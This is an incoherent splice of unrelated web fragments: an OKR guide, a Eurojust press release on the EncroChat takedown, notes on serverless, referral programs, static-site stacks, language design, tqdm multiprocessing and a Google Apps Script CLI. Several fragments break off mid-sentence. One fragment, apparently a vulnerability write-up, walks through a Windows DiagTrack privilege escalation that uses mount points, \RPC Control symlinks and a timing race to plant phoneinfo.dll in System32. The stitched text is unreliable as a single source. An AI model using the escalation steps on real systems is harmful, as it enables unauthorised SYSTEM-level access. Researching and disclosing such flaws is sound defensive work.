<ul><li>Increasing the MRR to X: this is our monthly revenue. If we want to grow, we should grow our revenue, too.&nbsp;</li><li>Decreasing the Churn rate to Y. The fewer users leave us, the easier it is for us to grow.</li><li>The CAC must not exceed: this is the Customer Acquisition Cost. If we want to be efficient, we can’t spend more than a certain amount on user acquisition.</li><li>Increasing the number of organic visitors to X. The more website visitors we have, the more purchases we generate.&nbsp;</li></ul>



<h3>OKR initiatives</h3>



<p>Objectives and key results should be value-oriented. So, you must learn not to mix them up with activities and tasks that need to be done to achieve the OKR. Initiatives will help in this.</p>



<p><strong>Initiatives </strong>are the very activities, tasks, and projects that you need to accomplish to achieve the OKR.</p>



<p>Let’s get back to our goal of doubling up. We’ve chosen several key results we’ll use to evaluate our success in the future. The KRs are to increase the MRR to X and decrease the Churn rate to Y. And these are the initiatives:&nbsp;&nbsp;</p>



<ul><li>launching the chatbot: a huge and awesome feature will help decrease the customer churn;</li><li>online course release will help generate new target leads;</li><li>the OKR book release will help increase the number of product signups.</li></ul>

<p><img src="http://www.eurojust.europa.eu/press/PressReleases/PublishingImages/2020-07-02_PR.jpg" alt=""></p><p><span>The Hague, 2 July 2020</span></p>


<p><strong>At a joint press conference today, French and Dutch law enforcement and judicial authorities, Europol and Eurojust presented the impressive results of a joint investigation team to dismantle EncroChat, an encrypted phone network widely used by criminal networks. </strong></p>
<p><strong>Over the last months, the joint investigation made it possible to intercept, share and analyse millions of messages that were exchanged between criminals to plan serious crimes. For an important part, these messages were read by law enforcement in real time, over the shoulder of the unsuspecting senders. </strong></p>
<p><strong>The information has already been relevant in a large number of ongoing criminal investigations, resulting in the disruption of criminal activities including violent attacks, corruption, attempted murders and large-scale drug transports. Certain messages indicated plans to commit imminent violent crimes and triggered immediate action. The information will be further analysed as a source of unique insight, giving access to unprecedented volumes of new evidence to profoundly tackle organised criminal networks.  </strong></p>

<p>In recent years, European countries have been increasingly affected by organised crime groups who are pervasive and highly adaptive, posing one of the most pressing security challenges faced by law enforcement and judicial authorities. In this regard, the abuse of the encrypted communication technologies is a key facilitator of their criminal activities.</p>
 

<p>Since 2017, the French <em>Gendarmerie </em>and judicial authorities have been investigating phones that used the secured communication tool EncroChat, after discovering that the phones were regularly found in operations against organised crime groups and that the company was operating from servers in France. Eventually, it was possible to put a technical device in place to go beyond the encryption technique and have access to the users' correspondence.</p>

<p>In early 2020, EncroChat was one of the largest providers of encrypted digital communication with a very high share of users presumably engaged in criminal activity. User hotspots were particularly present in source and destination countries for cocaine and cannabis trade, as well as in money laundering centres.</p>
 

<p><a href="http://www.eurojust.europa.eu/doclibrary/corporate/Infographics/The%20dismantling%20of%20an%20encrypted%20phone%20solution%20used%20by%20organised%20crime%20groups%2c%202020/2020-07_Infographic-Encrochat-Case.pdf" target="_blank"><img src="http://www.eurojust.europa.eu/press/PressReleases/PublishingImages/2020-07-02_PR-infographic-thumbnail.png" alt=""></a>Given the widespread use of the encrypted telephone solution by EncroChat among international criminal networks around the world, French authorities decided to open a case at Eurojust, the EU Agency for Criminal Justice Cooperation, towards the Netherlands in 2019. Further developments in the investigations led to organising the processing of the data, which was captured on the basis of the provisions of French law and with judicial authorisation, through the frameworks for international judicial and law enforcement cooperation. [<em>Click on image to enlarge</em>].</p>

<p>The data was in first instance shared with the Netherlands. Eurojust facilitated the creation of a joint investigation team (JIT) between the two countries and with the participation of Europol, the European Union Agency for Law Enforcement Cooperation, in April 2020. </p>

<p>Europol has been actively involved in the investigations led by France and the Netherlands since 2018, relating to the provision and use of encrypted communication services by organised crime groups. Through its role as an information hub and its extensive analytical and technical support system, Europol was able to create and provide a unique and global insight on the scale and functioning of organised crime, as a result of this investigation. This will help law enforcement to combat organised crime in the future more successfully. Europol’s support from the early stages of this JIT included: promoting and arranging international cooperation, providing extensive analytical and financial support, technical expertise and a secured platform for the exchange of information between the countries involved.  A large dedicated team at Europol investigated in real time millions of messages and data that it received from the JIT partners during the investigation, cross-checked and analysed the data, and provided and coordinated with the JIT partners the information exchange to concerned countries.</p>

<p><img src="http://www.eurojust.europa.eu/press/PressReleases/PublishingImages/2020-07-02_PR_GendarmerieNationale.jpg" alt="">A large number of suspects have also been arrested in several countries which were not participating in the JIT but particularly affected by the illegal use of these phones by individuals active in organised crime, including in the UK, Sweden and Norway. Many of these investigations were connected with international drug trafficking and violent criminal activities.</p>

<p>At the same time, numerous operational meetings for the daily coordination between the law enforcement entities of the JIT partners and other countries took place at Europol, partly during COVID-19.</p>

<p>Eurojust intensively facilitated the judicial cooperation, during the extensive use of European judicial cooperation instruments such as European Investigation Orders. Throughout the investigation, the JIT members organised five coordination meetings at Eurojust to bring all involved parties together in a secure environment, identify parallel or linked investigations, decide on the most suitable framework for cooperation and solve potential conflicts of jurisdiction.  </p>

<p>In France, where the operation takes place under the code name "Emma 95", the Gendarmerie has set-up a Taskforce since March 2020. With more than 60 officers, the Gendarmerie leads the investigations targeting the EncroChat encrypted telephone solution under the supervision of the magistrates of the JIRS of Lille. The Taskforce has been monitoring the communications of thousands of criminals, leading to the opening of a wide range of incidental proceedings. France does not wish to communicate further on these on-going investigations nor on the results obtained. The considerable resources deployed demonstrate the importance of these investigations and the importance attached to their success in France. </p>

<p>In the Netherlands, where the operation went under the code name “Lemont”, hundreds of investigators have, with authorisation of the examining magistrate, followed the communications of thousands of criminals day and night since the operation began to unravel and act on the intercepted data stream. The criminal investigation has been led by prosecutors from the Dutch National Public Prosecution Service and the information has been made available to about a hundred ongoing criminal investigations. The investigation has so far led to the arrest of 60 suspects, the seizure of drugs (more than 10 000 kilo cocaine, 70 kilo heroin, 12 000 kilo cannabis, 1 500 kilo crystal meth and 160 000 liter of a substance used to produce synthetic drugs), the dismantling of 19 synthetic drugs labs, the seizure of dozens of (automatic) fire weapons, expensive watches and 25 cars, including vehicles with hidden compartments, and almost EUR 20 million in cash. The expectation is that information will be made available in more than 300 investigations. In a number of cases, more arrests are very likely to follow in the coming period. </p>

<p>The interception of EncroChat messages came to an end on 13 June 2020, when the company realised that a public authority had penetrated the platform. EncroChat then sent a warning to all its users with the advice to immediately throw away the phones.</p>
 

<p>While the activities on EncroChat have been stopped, this complex operation shows the global scope of serious and organised crime and the connectivity of criminal networks who use advanced technologies to cooperate on a national and international level. The effects of the operation will continue to echo in criminal circles for many years to come, as the information has been provided to hundreds of ongoing investigations and, at the same time, is triggering a very large number of new criminal investigations of organised crime across the European continent and beyond. </p>

<p><strong>What is EncroChat?</strong></p>

 
<p><img src="http://www.eurojust.europa.eu/press/PressReleases/PublishingImages/2020-07-02_encrochat.png" alt="">EncroChat phones were presented to customers as guaranteeing perfect anonymity (no device or SIM card association on the customer's account, acquisition under conditions guaranteeing the absence of traceability) and perfect discretion both of the encrypted interface (dual operating system, the encrypted interface being hidden so as not to be detectable) and the terminal itself (removal of the camera, microphone, GPS and USB port). It also had functions intended to ensure the ‘impunity’ of users (automatic deletion of messages on the terminals of their recipients, specific PIN code intended for the immediate deletion of all data on the device, deletion of all data in the event of consecutive entries of a wrong password), functions that apparently were specially developed to make it possible to quickly erase compromising messages, for example at the time of arrest by the police. In addition, the device could be erased from a distance by the reseller/helpdesk.</p>

<p>EncroChat sold the cryptotelephones (at a cost of around EUR 1 000 each) at international scale and offered subscriptions with a worldwide coverage, at a cost of 1 500 EUR for a six-month period, with 24/7 support.</p>

<p><strong>Serverless</strong> gives us the power to focus on delivering value to our customers without worrying about the maintenance and operations of the underlying compute resources. Cloud providers (like AWS), also give us a huge number of managed services that we can stitch together to create incredibly powerful, and massively scalable serverless microservices.</p>
<p>Almost 2 years ago now, I wrote a post on<strong> <a href="https://www.jeremydaly.com/serverless-microservice-patterns-for-aws/">Serverless Microservice Patterns for AWS</a>&nbsp;</strong>that became a popular reference for newbies and serverless veterans alike. The capabilities of serverless have changed dramatically since then, opening up a ton of new patterns and possibilities. This project is intended to capture, share, explore, and debate the patterns and practices being used in serverless production applications today.</p>
<p>I will be adding new patterns regularly, each with interactive architecture diagrams to help you better understand them, and sample templates for you to begin quickly implementing them in your serverless projects. <strong>This is a community effort, so <a href="https://github.com/jeremydaly/reference-architectures" target="_blank" rel="noopener">contributions</a> are welcome and greatly appreciated.</strong> Enjoy!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        

                          <p><em><span>Integrating a referral program has been proven to be the most effective way to drive new traffic. Before looking for a reliable </span><a href="https://www.purrweb.com/"><span>MVP development company</span></a><span>, make sure you know how to create a working referral program for your future startup.&nbsp;</span></em><span><br>
</span></p>
<p>First, let’s figure out together what the term ‘Referral program’ actually means. Basically, it’s is a recruiting strategy, that enables users to get some kind of benefits in exchange for referrals.</p>
<p>Two reasons why referral programs are super effective:</p>
<ul>
<li>We trust people more than advertising.</li>
<li>When buying goods or services we usually rely on users’ experience.</li>
</ul>
<p>Referred users tend to be more loyal than people, who were attracted by advertising content. It generally takes them less time to try a new product and then make the first purchase.</p>
<p>Below we shared a couple of things to keep in mind when building a referral program for startup. Check them all to let your small business grow:</p>
<h2>Find a way to motivate users</h2>
<p>To create a truly working referral program for startup, think of what you may offer to make someone share your product with others.</p>
<p>Some product owners may think something like ‘Hey, my product is freaking awesome. Why should I stimulate users, who are already happy with it? Let us disappoint you — ‘being awesome’ is just a natural stare of things. If a product is NOT awesome (the entire concept, UI/UX), nothing will work. Don’t sit it out waiting for new customers to come — it is nothing but a waste of time and money.</p>
<p>To make users recommend you, take into account their social activity. Be it an app for pet owners or a free-trial music marketplace, users are just ordinary people who care primarily about their own problems. Will they spare even a few minutes of their precious time to send referral-invites?</p>

<h5>Being ‘just awesome’ isn’t truly awesome</h5>
<p>You might say ‘Ok. How much should I pay for every new user?’ In some cases, money reward doesn’t even work. Why? Because some users may think that the product price isn’t attractive enough to make them believe that recommending ‘this thing’ to friends is a good idea. In this case, it’s better to give them stuff like extra storage space or free premium subscription.</p>
<p>A few examples for you to check:</p>
<blockquote>
<p><em>When the majority of Dropbox users wanted to get extra storage space, the company launched a referral program with extra space for each new user invited. For every referral, both a user and a referral got 500MB of free storage space. With a free account, the user could invite up to 32 new users for a whopping total of 16 GB of bonus storage space. Pro account users earned 1 GB per referral, for a total of 32 GB of bonus storage space.</em></p>
<p><em>Trello gives a free month of Trello Gold (up to 12 months) for every person you get to join this app.&nbsp;</em></p></blockquote>
<h2>Figure out what a referral action will be</h2>
<p>How to create a working referral program for startup? Find out what a user should do to get benefits. A user must achieve the main goal — attract new customers to your startup. And this is what you should reward for — for the provided value, not actions.</p>
<blockquote><p><em>When people invite friends to Evernote, they earn points. Points can be used for monthly or annual subscriptions to Evernote Premium.</em></p></blockquote>
<h5>Reward not for sending invitations, but for new users</h5>
<h2>Is there anything else to keep in mind?</h2>
<p>Clearly explain the required referral actions in your marketing messages. Help users understand what exactly they should do and how they’ll be rewarded. Use plain language and provide all the needed details —&nbsp; a quick demo or an overview with referral program rules will be more than enough.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="frontend-stack">Frontend Stack</h2>
<p>Until somewhat recently, I think that hosting was probably a more important concern for creating a personal site than the frontend stack. But with options like <a href="https://pages.github.com/">Github Pages</a>, <a href="https://www.netlify.com/">Netlify</a>, and <a href="https://vercel.com/">Vercel</a>, the hosting part of the equation has become a whole lot easier. Nowadays a personal site is all about what you build it with. I think it's fair to say most people looking to build a personal site are, in equal parts, wanting to get a professional foothold on the web and also just have fun building something new. And when building something new, there is a whole lot of new out there. So much so, that many people cannot even bring themselves to begin because they're afraid of picking the wrong stack.</p>
<h3 id="picking-a-framework">Picking A Framework</h3>
<p>A good question to ask yourself when picking a framework is which of the two following focuses is most important to you.</p>
<h4 id="1-javascript">1) Javascript</h4>
<p>Javascript, the necessary evil turned eternal turf war, is probably at top of mind for most people looking to build a personal site in order to "play with new tech". This is also a great splitter of options if you do know what javascript framework you want to work in. If you still cannot decide on a framework, then you probably have more this vs that javascript framework articles to read.</p>
<h5 id="react">React</h5>
<p>If you must work with <a href="https://reactjs.org/">React</a>, <a href="https://www.gatsbyjs.org/">Gatsbyjs</a> and <a href="https://nextjs.org/">Nextjs</a> are very popular and capable options. Gatsbyjs takes a more holistic approach between the frontend and the backend whereas Nextjs is mostly concerned with creating a static and ssr environment for React apps.</p>
<h5 id="vuejs">VueJs</h5>
<p>If you must work with Vuejs (my personal favorite), <a href="https://nuxtjs.org/">Nuxtjs</a> (what <a href="https://formcake.com/">formcake.com</a> is build on), <a href="https://gridsome.org/">Gridsome</a>, and <a href="https://vuepress.vuejs.org/">VuePress</a> are all great options. As is often the case in the world of Vue, it is often easiest to compare Vue based project's with their React equivalents. Gridsome is like Gatsbyjs and Nuxtjs is like Nextjs. VuePress is much more targeted to those who want to create a site for blogging.</p>
<h5 id="angular">Angular</h5>
<p>I cannot really imagine someone making a personal site in Angular unless they really want to force themselves to learn Angular for a job of some kind but there is an interesting <a href="https://angular.io/">Angular</a> static site generator project called <a href="https://github.com/scullyio/scully">Scully</a> that I have been meaning to try. If anyone reading this has played with Scully, send me your thoughts to <a href="mailto:david@formcake.com">david@formcake.com</a>.</p>
<h5 id="x-cool-kid-framework">X Cool Kid Framework</h5>
<p>You are on your own.</p>

<p>Perhaps you are more concerned with creating a blog and how a framework's authoring experience works than what technology powers the rendering of html. X JS forward frameworks tend to require a lot more configuration than those made specifically for creating a simple site. If this is your situation, you are in luck. There are tons of options and they are all fantastic for this purpose. I will go more in depth on some of these options since they are more tailored for a small perosnal site.</p>
<h5 id="jekyll">Jekyll</h5>
<p><a href="https://jekyllrb.com/">Jekyll</a> is the one of the oldest static site generators that made authoring a top concern with its use of Markdown. Built in 2008 by Tom Preston-Werner, Jekyll was part of the Rails era of web development where developer productivity was considered paramount to everything else. Jekyll is still very popular but is a bit of a non starter for many because it is built in Ruby. Still a great choice for a developer blog but you will have to use RubyGems instead of NPM.</p>
<h5 id="hugo">Hugo</h5>
<p><a href="https://gohugo.io/">Hugo</a> is a more modren framework than Jekyll. It tries to solve more problems out of the box than Jekyll, is more flexible, and considers the speed at which it creates pages to be a top concern. Part of Hugo's popularity comes from the fact that it is written in Go. This contributes to its speed but also contributes to some of the annoying aspects about it. Go is an interesting language but most of us don't have the opportunity to use it in our work. It is therefore best for those who love Go and don't mind using Go's templating libraries. You will also have to give up NPM if you choose Hugo.</p>
<h5 id="eleventy">Eleventy</h5>
<p>One of the newest kids on the block, <a href="https://www.11ty.dev/">Eleventy</a> is somewhere inbetween Hugo and Jekyll. It's focus is on flexibility and speed. It is super modular so it does take a little bit more time to get setup but for those looking for flexiblity, Eleventy has it in spades. It supports 11 templating language and best of all, it is a node library so you can use NPM for your entire project. This may be my personal choice if I were creating a new blog.</p>
<h2 id="other-concerns">Other Concerns</h2>
<h4 id="3-static">3) Static????</h4>
<p>Yes. In 2020 there is no reason to choose a framework that does not support static generation of pages for a small personal website. Every framework listed above supports static generation. If you need to be convinced of the power of static websites, checkout <a href="https://jamstack.org/">jamstack.org</a> which does a good job of going into all the benifits.</p>
<h4 id="4-hosting">4) Hosting</h4>
<p>As long as we have made the decision to use static generation, hosting is quite easy. There are still a lot of options however. Here are some of the top options and some of the thinking for when to use them.</p>
<h5 id="netlify">Netlify</h5>
<p><a href="https://www.netlify.com/">Netlify</a> is the hosting platform behind the <a href="https://jamstack.org/">JAMStack</a> movement. Founded in 2014, Netlify has grown rather quickly and has become the defacto hosting platform for static sites. With Netlify you can host static sites, deploy lambdas, and create git based workflows with extreme ease. I would recommend Netlify above all other options for a personal site.</p>
<h5 id="vercel-previously-zeit">Vercel (Previously Zeit)</h5>
<p><a href="https://vercel.com/">Vercel</a> is a very similar hosting platform as Netlify. Founded in 2015, Vercel boasts a fully featured platform for hosting static sites including git workflows and lambdas. I have used Vercel for years and I can recommend it. Vercel is a solid choice but I would recommend Netlify above Vercel for a fully featured static hosting platform.</p>
<h5 id="github-pages">Github Pages</h5>
<p><a href="https://pages.github.com/">Github pages</a> is quite an old option in the space of static website hosting. Launched in 2008 Github pages originally only supported Jekyll and static files but now supports other frameworks through some configuration. Github pages was once unique in that it automatically was integreted into your github account but this is now a common feature with the likes of Netlify and Vercel. Github pages is underpowered at this point but will always be free. If you want to host something simple and never think about it again, Github pages may be just the right choice.</p>
<h5 id="firebase">Firebase</h5>
<p><a href="https://firebase.google.com/">Firebase</a> is a platform as a service hosting provider that has some seriously robust features and is backed by Google. Firebase is not a static website hosting provider and aims to solve much more complicated issues around creating and hosting a sophisticated web application. The only reason you would want to choose Firebase is if you wanted authentication for some reason. Firebase allows for simple authentication and storage via it's flagship features <a href="https://firebase.google.com/products/auth">Firebase Authentication</a> and Firebase <a href="https://firebase.google.com/products/realtime-database">Realtime Database</a>. Firebase may also be a good option if you want to play with server tech but don't want to go too deep into the subject.</p>
<h5 id="heroku">Heroku</h5>
<p><a href="https://www.heroku.com/">Heroku</a> lit the world of application hosting on fire in 2007 when it made hosting a <a href="https://rubyonrails.org/">Ruby on Rails</a> application as simple as a couple of key strokes using the Heroku CLI. Like Firebase, Heroku aims to solve much more complex problems than a simple static website but is a great system for those who like to tinker with their backend. Heroku is for those who need to solve more complicated problems like storage or authentication, but want to do it with open source software instead of google invented technologies. If you are building a personal site to learn server tech, Heroku is a great option.</p>
<h4 id="5-apis">5) APIs</h4>
<p>Assuming you went with one of the hosting platforms specifically designed for simple static websites, you may be wondering "But what if I need a server for X". You are in luck, there is a great resource created by <a href="https://chriscoyier.net/">Chris Coyer</a>, of <a href="https://css-tricks.com/">CSS Tricks</a> and <a href="https://codepen.io/">Codepen</a> fame, that lists services that are great for static websites without a server, <a href="https://serverless.css-tricks.com/services/major">https://serverless.css-tricks.com/services/major</a>. <a href="https://formcake.com/">Formcake</a> also perfectly solves the problem of how to create a contact form on a static website. Formcake is committed to always having a useful free tier for developers with small projects. Consider checking it out the next time you tackle building your personal site.</p>

The limited control over the files content makes exploitation very hard; perhaps crafting an executable PowerShell script or bat file is plausible, but then there is the problem of getting those executed.</p><p>Instead, I chose to combine my active trace recording with a call to:</p><pre><code>WINRT_IMPL_AUTO(Windows<span>::</span>Foundation<span>::</span>IAsyncAction) SnapCustomTraceAsync(param<span>::</span>hstring <span>const</span><span>&amp;</span> outputDirectory)
</code></pre><p>When supplying an <code>outputDirectory</code> value located inside <code>%WINDIR%\temp\DiagTrack_alternativeTrace</code> (Where the <code>.etl</code> files of my running trace are saved) an interesting behavior emerges.</p><p>The Diagtrack Service will rename <em>all</em> the created <code>.etl</code> files in <code>DiagTrack_alternativeTrace</code> to the directory given as the <code>outputDirectory</code> argument to <code>SnapCustomTraceAsync</code>. This allows destination control to be acquired because rename operations that occur where the source file gets created in a folder that grants non-privileged users write access are exploitable. This is due to the permission inheritance of files and their parent directories. When a file is moved by a rename operation, the DACL does not change. What this means is that if we can make the destination become <code>%WINDIR%\System32</code>, and somehow move the file then we will still have write permission to the file. So, we know we control the <code>outputDirectory</code> argument of <code>SnapCustomTraceAsync</code>, but some limitations exist.</p><p>If the chosen <code>outputDirectory</code> is not a child of <code>%WINDIR%\temp\DiagTrack_alternativeTrace</code>, the rename will not happen. The <code>outputDirectory</code> cannot exist because the Diagtrack Service has to create it. When created, it is created with SYSTEM as its owner; only the READ permission is granted to users.</p><p>This is problematic as we cannot make the directory into a mount point. Even if we had the required permissions, we would be stopped by not being able to empty the directory because Diagtrack has placed the snapshot output etl file inside it. Lucky for us, we can circumvent these obstacles by creating two levels of indirection between the <code>outputDirectory</code> destination and <code>DiagTrack_alternativeTrace</code>.</p><p>By creating the folder <code>DiagTrack_alternativeTrace\extra\indirections</code> and supplying <code>%WINDIR%\temp\DiagTrack_alternativeTrace\extra\indirections\snap</code> as the <code>outputDirectory</code> we allow Diagtrack to create the snap folder with its limited permissions, as we are inside <code>DiagTrack_alternativeTrace</code>. With this, we can rename the <code>extra</code> folder, as it is created by us. The two levels of indirection is necessary to bypass the locking of the directory due to Diagtrack having open files inside the directory. When <code>extra</code> is renamed, we can recreate <code>%WINDIR%\temp\DiagTrack_alternativeTrace\extra\indirections\snap</code> (which is now empty) and we have full permissions to it as we are the owner!</p><p>Now, we can turn <code>DiagTrack_alternativeTrace\extra\indirections\snap</code> into a mount point targeted at <code>%WINDIR%\system32</code> and Diagtrack will move all files matching <code>WPR_initiated_DiagTrack*.etl*</code> into <code>%WINDIR%\system32</code>. The files will still be writeable as they were created in a folder that granted users permission to WRITE. Unfortunately, having full control over a file in System32 is not quite enough for code execution… that is, unless we have a way of executing user controllable filenames - like the DiagnosticHub plugin method popularized by <strong><a href="https://twitter.com/tiraniddo">James Forshaw</a></strong>. There’s a caveat though, DiagnosticHub now requires any DLL it loads to be signed by Microsoft, but we do have some ways to execute a DLL file in system32 under SYSTEM security context - if the filename is something specific. Another snag though is that the filename is not controllable. So, how can we take control?</p><p>If instead of making the mountpoint target System32, we target an Object Directory in the NT namespace and create a symbolic link with the same name as the rename destination file, we gain control over the filename. The target of the symbolic link will become the rename operations destination. For instance, setting it to<code>\??\%WINDIR%\system32\phoneinfo.dll</code> results in write permission to a file the Error Reporting service will load and execute when an error report is submitted out of process. For my mountpoint target I chose <code>\RPC Control</code> as it allows all users to create symbolic links inside.</p><p>Let’s try it!</p><p>When Diagtrack should have done the rename, nothing happened. This is because, before the rename operation is done, the destination folder is opened, but now is an object directory. This means it’s unable to be opened by the file/directory API calls. This can be circumvented by timing the creation of the mount point to be after the opening of the folder, but before the rename. Normally in such situations, I create a file in the destination folder with the same name as the rename destination file. Then …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								<p>I’ve been thinking about designing my own programming language for a long time. I’ve actually been keeping a lot of notes, and even throwing together some code when I can find time. My plan is to build something that takes inspiration from LISP, JavaScript and Smalltalk. I think there’s a niche to be filled. There are many new programming languages coming out lately, but most of them are statically typed and compiled ahead of time. The <a href="https://en.wikipedia.org/wiki/Dynamic_programming_language">dynamic languages</a> that do come out often don’t perform very well (see CPython, Ruby) or have poorly thought out&nbsp;semantics.</p>
<p>I’ve written a few&nbsp;blog posts pointing and laughing at perceived failures of JavaScript, but the truth is that programming language design is hard.&nbsp;There’s no limit to the complexity of the things you can build with programming code. No matter the design choices you make, no matter the language you design, there are bound&nbsp;to be some inconsistencies and weaknesses somewhere.&nbsp;I think that Smalltalk is a very inspiring programming language, revolutionary in many ways, but it’s also one that has gone extinct. It’s interesting, in my opinion, to ask ourselves why Python thrives but Smalltalk died.</p>
<p>Like LISP, Smalltalk implemented some interesting features which have influenced other languages (such as Java and JavaScript). Some nifty features of Smalltalk are really cool, but still aren’t implemented in any other language. For instance, Smalltalk had the ability to suspend running programs into a saved image, and resume execution later at the saved point. As you can imagine, this is extremely powerful and useful. Forget saving documents or saving games, just save the state of an entire program, no implementation effort required.</p>
<p>I found an interesting talk on YouTube titled “What Killed Smalltalk could Kill Ruby Too”:</p>
<p><span><iframe width="560" height="315" src="https://www.youtube.com/embed/YX3iRjKj7C0?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
<p>Robert Martin makes the case that one of the big weaknesses of Smalltalk is&nbsp;that it was just “too easy to make a mess”. Smalltalk was highly dynamic, and encouraged people to “monkey patch” things and do quick fixes/hacks.&nbsp;He also makes the point that Smalltalk just “didn’t play well with others”. When you think about it, Smalltalk had its own source control, IDE and GUI built into live images, living alongside your program. Smalltalk isn’t just a language, it’s an operating system and a way of life. It’s conflating things that would maybe be best left separate.</p>
<p>It seems to me that in some key areas, the&nbsp;Smalltalk creators placed their own radical ideas above everything else. They chose idealism over pragmatism. Smalltalk was a language created with a grandiose vision. It had some deeply rooted principles which didn’t necessarily work so well in practice, such as the idea that everything had to be an object, that the object metaphor should be applied everywhere, one size fits all.&nbsp;At the end of the day, programmers want to get things done and be productive. If the language design or implementation gets in the way of getting things done, people will leave. Pragmatism is key for a programming language to succeed.</p>
<p>Smalltalk was also designed with the idea that it should be easy to learn and intuitive. This has led its creators to have a heavy focus on graphical user interfaces.&nbsp;I watched an introduction to <a href="https://www.youtube.com/watch?v=Ox5P7QyL774">Self on YouTube</a>&nbsp;(Self is a direct descendent of Smalltalk) and saw the heavy emphasis on interacting with objects through UIs. The user interfaces showcased in this video are, in my opinion, horribly complex and unintuitive. Pretty much all of the interactions done through the UI would have been simpler and easier to understand if they had been done by writing one or two lines of code instead!</p>
<p>When you sit down and think about it for one second, you have to realize that programming doesn’t fundamentally have anything to do with graphical user interfaces. Yes, you can use programming code to create GUIs, but there is no reason that programming should have to involve GUIs and be tied to them. The metaphor of writing code has been extremely successful since the very beginning, and it probably makes more sense to the mathematical mind of a skilled programmer. Not everything has to have a visual metaphor. This is again a case of pushing some idealistic principle too far, in my opinion.</p>
<p>I believe that a lack of pragmatism is something that has killed many languages. Not just Smalltalk, but Scheme too. My first experience with Scheme involved trying and failing to install multiple Scheme distributions because I couldn’t get all the dependencies to work. Then, finally getting a Scheme compiler installed, and struggling to implement simple routines to parse text files, because Scheme doesn’t include&nbsp;the most basic string routines. The Scheme compiler I’d selected bragged that the code it produced was highly optimized, but once I finally managed to write my own string routines, I compiled my program, ran it, and it was dog slow.&nbsp;Parsing a one-megabyte CSV spreadsheet took over a minute. I ended up rewriting the code in Python. Why don’t more people code in Scheme? Because they try to realize their ideas in Scheme, and it just doesn’t quite work out.</p>

      <h3 id="introduction">Introduction</h3>

<p>It is natural that we would like to employ progress bars in our programs to show the progress of tasks. <code>tqdm</code> is one of my favorite progressing bar tools in Python. It could be easily incorporated to Python using <code>trange</code> to replace <code>range</code> or using <code>tqdm.tqdm</code> to wrap iterators, in order to show progress bars for a <code>for</code> loop.</p>



<p>Multiprocessing tasks should also have progress bars to show the progress. However, the incorporation of <code>tqdm</code> and <code>multiprocessing</code> was not well documented in Python. In this blog post, I would like to present several ways of using <code>multiprocessing</code> with <code>tqdm</code>.</p>

<h3 id="python-multiprocessing">Python Multiprocessing</h3>

<p>Let’s first take a look at some of the basic class methods in Python <code>multiprocessing</code> library. The commonly used <code>multiprocessing.Pool</code> methods could be broadly categorized as <code>apply</code> and <code>map</code>. <code>apply</code> is applying some arguments for a function. <code>map</code> is a higher level abstraction for <code>apply</code>, applying each element in an iterable for a same function.</p>



<p>More specifically, the commonly used <code>multiprocessing.Pool</code> methods are:</p>

<ul>
  <li><code>apply_async</code></li>
  <li><code>map</code></li>
  <li><code>map_async</code></li>
  <li><code>imap</code></li>
  <li><code>imap_unordered</code></li>
</ul>

<p><code>apply_async</code> and <code>map_async</code> return “future results” immediately, we would need to collect the results using <code>get</code>. <code>map</code>, although it is running functions in parallel, blocks the return of the results until they are ready. <code>imap</code> is a lazier version of <code>map</code>, but it will return an iterator for the processes. <code>imap_unordered</code> is similar to <code>imap</code>, but the execution and returned result order of <code>imap_unordered</code> does not necessarily follow the order of arguments provided.</p>



<p>Based on the nature of these methods, <code>apply_async</code>, <code>imap</code>, <code>imap_unordered</code> are naturally compatible with <code>tqdm</code> to show progress bars.</p>

<h3 id="python-multiprocessing-tqdm-examples">Python Multiprocessing tqdm Examples</h3>

<h4 id="many-small-processes">Many Small Processes</h4>

<p>Sometimes, the entire task consists of many small processes, each of which does not take too much time to finish. The number of processes is much larger than the number of processes we could assign to the <code>multiprocessing.Pool</code>. We would like to monitor the progress of the entire task using one progressing bar.</p>



<p>The bottom line is not modifying the functions we would like to run using <code>multiprocessing</code> and <code>tqdm</code>. In the following examples, I have implemented the examples of using <code>apply_async</code>, <code>imap</code>, <code>imap_unordered</code> with <code>tqdm</code> for functions that take one single argument or multiple arguments.</p>

<p>During the execution of the multiprocessing program, we could see that the 100 jobs were run in 10 batches whose batch size is 10. Each batch roughly takes 0.5 seconds, and the total execution time is roughly 5 seconds.</p>

    <p><strong>tl;dr</strong> google app script local client available <a href="https://gitlab.com/snippets/1988224">here</a></p>
<h2 id="intro">intro</h2>
<p><a href="https://developers.google.com/apps-script/">google app script</a> is a pretty interesting tool. It can be viewed as the “glue script” that ties different google applications together. Functionality wise, it has everything you need to create a web application - data persistence, web endpoint deployment, authentication - you name it, we have it.</p>
<p>However, the platform didn’t seem to have much adopters, besides the occasional google sheets functions.</p>
<p>One of the reason this is so, is the lack of native support for versioning. It does have some sort of history, but it does not tie in strongly with the git workflow that most developers are used to.</p>
<p>Plus, the main way to interface with the scripts is through the web editor - compared to anyone’s favorite ide, can be quite lacking.</p>
<p>This cli interface here aims exactly to solve that. You can push, pull and deploy your code to google app script while handling all the development on your local machine.</p>
<p>Once you pull them to your local machines, they are just text files. You can do whatever you wish to the files, version them using git, edit them using vim, whatever it is you do to text files.</p>
<h2 id="gas-description">gas description</h2>
<p>Google app script system is built around a few main ideas.</p>
<p>First is its file versioning system. There is always the most updated files, in git you can think of it as the <code>HEAD</code>. To download the latest files, do <code>gas pull</code>. <code>gas push</code> whatever you have online and update the remote project.</p>
<p>The “versions” of the google app script system can be though of as tags in the the git system. You can choose to tag certain commits to mark them to save their states.</p>
<p>“Deployment” of the google app script can only be done on tags. To deploy the local files, you have to go through a few stages, push the files to remote, create a new version, and deploy using the newly created version - all that is done for you in <code>gas deploy udp</code>.</p>
<p>To fully understand how the whole mechanism work, the <a href="https://developers.google.com/apps-script/api/reference/rest">app script api</a> is a good place to start. There, you can learn what is possible with the api, and understand how the whole application was built.</p>
<h2 id="features">features</h2>
<pre><code>-h to perform help

gas login - save credentials locally to ~/gasrc.json
gas init - initialize new GAS project in directory

gas push - push project files back to google app script
gas pull - pull project files from google app script

gas vers - list project versions saved
gas vers new - create new project version

gas proc - view processes

gas deploy - list project deployments
gas deploy set - set default deployment to push to
gas deploy rm - remove project deployment
gas deploy new - create new project deployment
gas deploy upd - update the default project deployment
